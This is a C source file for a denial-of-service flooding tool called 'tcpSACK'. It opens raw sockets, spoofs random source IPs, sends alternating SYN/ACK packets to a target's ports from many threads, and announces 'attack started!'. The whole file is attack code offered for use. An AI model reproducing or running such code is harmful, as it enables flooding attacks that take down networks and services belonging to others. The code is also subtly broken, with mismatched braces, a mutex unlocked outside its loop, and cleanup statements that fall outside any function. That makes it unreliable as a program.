#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/tcp.h>
#include<arpa/inet.h>
#include<netinet/ip.h>
#include<pthread.h>
#include<unistd.h>
#include<sys/types.h>
#include<stdbool.h>
#include<time.h>

// declare global variables
static unsigned int floodport; // port to send packets to
#define BUFFER_SIZE 100 // buffer size constant
char sourceip[17]; // source IP address buffer
volatile int limiter; // pps (packets per second) limiter
volatile unsigned int pps; // pps count
volatile unsigned sleeptime = 100; // sleep (ms) for each packet if pps limit is exceeded
volatile unsigned int length_packet = 0; // length of packet (can be set for bypassing)

// mutex for thread safety when modifying global variable "pps"
pthread_mutex_t pps_mutex = PTHREAD_MUTEX_INITIALIZER;

// structure for pseudo tcp header used in checksum calculation
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
    struct tcphdr tcp;
};

// calculate checksum for packet
unsigned short checksum_tcp_packet(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    // checksum calculation
    sum=0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    // handle odd byte
    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    // fold sum to 16 bits and take complement
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return(answer);
}

// thread function that performs flooding
void *flooding_thread(void *par1)
{
    // create raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1)
    {
        perror("[!] you need to run the script as root [!]");
        exit(1);
    }

    // declare variables 
    char *targettr = (char *)par1;
    char datagram[4096], source_ip[32], *data, *pseudogram;
    memset(datagram, 0, 4096); // clear the buffer

    // ipv4 header
    struct iphdr *iph = (struct iphdr *) datagram;

    // tcp header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    // data part of packet
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    if(length_packet == 0) {
        strcpy(data, ""); // bypasses pps limit if set to 0
    }

    // randomize source address (ipv4)
    snprintf(source_ip, 32, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
    sin.sin_family = AF_INET;
    int rdzeroport;
    // pick a random destination port
    if (floodport == 1) {
        rdzeroport = rand() % 65535 + 1;
        sin.sin_port = htons(rdzeroport);
        tcph->dest = htons(rdzeroport);
    } else {
        sin.sin_port = htons(floodport);
        tcph->dest = htons(floodport);
    }

    // other ip packet handlers
    sin.sin_addr.s_addr = inet_addr(targettr);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
    iph->id = htons(1);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // set to 0 before calculating the checksum
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = checksum_tcp_packet((unsigned short *) datagram, iph->tot_len);

    // randomizing tcp header fields
    int randSeq = rand()% 10000 + 99999;
    int randAckSeq = rand() % 10000 + 99999;
    int randSP = rand() % 2 + 65535;
    // int randWin = rand()%1000 + 9999;
    tcph->source = randSP; // random source port
    tcph->seq = randSeq;
    tcph->ack_seq = 0; // initially 0 but will be set for ACK packets
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); // max window size
    tcph->check = 0; // checksum
    tcph->urg_ptr = 0;

    // alternate between SYN/ACK flags
    if (rand() % 2) {
    tcph->syn = 1; // SYN packet
    tcph->ack = 0;
    } else {
    tcph->syn = 0;
    tcph->ack = 1; // ACK packet
    tcph->ack_seq = htonl(randAckSeq);
    }

    // set up pseudo-header for checksum
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);

    // copy headers to pseudogram for checksum calculation
    memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));
    tcph->check = checksum_tcp_packet((unsigned short*) pseudogram, psize);
    
    free(pseudogram); // free memory to prevent leaks

    // set up socket options
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("error setting up IP_HDRINCL");
        exit(1);
    }

    // flood loop
    while (1) {
        pthread_mutex_lock(&pps_mutex);
        pps++;
        if(pps >= limiter) {
            usleep(sleeptime);
        }
    pthread_mutex_unlock(&pps_mutex);

    // send loop
    if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        break; // exit loop if send fails
    }

    close(s); // close the socket
    return NULL;
}

// main function
int main(int argc, char *argv[])
{
    if(argc < 6){
        fprintf(stderr, "[+] tcpSACK [+]\n");
        fprintf(stderr, "[+] usage: %s <ip> <port> <number of threads> <time> <pps>\n", argv[0]);
        exit(-1);
    }
    //int multiplier = 20;
    //pps = 0;
    //limiter = 0;

    // arguments
    floodport = atoi(argv[2]);
    void *target = argv[1];
    int max_pps = atoi(argv[5]);
    int num_threads = atoi(argv[3]);
    length_packet = 0;
    pthread_t thread[num_threads];

    // thread creation
    //int alem = 0;
    
    fprintf(stdout, "[+] starting threads...\n");
    for(int i = 0; i < num_threads; i++){
        if(pthread_create(&thread[i], NULL, &flooding_thread, target) != 0){
            perror("thread creation failed!");
            exit(1);
        }
    }
    //for(alem = 0;alem < num_threads;alem++){
      //  if(pthread_create(&thread[alem], NULL, &flooding_thread, (void *)argv[1]) != 0) {
        //    perror("thread creation failed!");
          //  exit(1);
        //}
    //}
    
    fprintf(stdout, "[-] attack started!\n");

    // control loop for packet send rate
    for(int i = 0;i < (atoi(argv[4]) * 1000);i++) {
        usleep(1000);
        pthread_mutex_lock(&pps_mutex);
        if(pps > max_pps) {
            limiter++;
            sleeptime += 100;
        } else {
            if(limiter > 0) {
                limiter--;
            }
        }
        if(sleeptime > 25) {
            sleeptime -= 25;
        } else {
            sleeptime = 0;
        }
    }
    pps = 0;
    pthread_mutex_unlock(&pps_mutex);
}

// cleanup + exit
for(int i = 0; i < num_threads; i++) {
    pthread_cancel(thread[i]);
}
        
return 0;
}
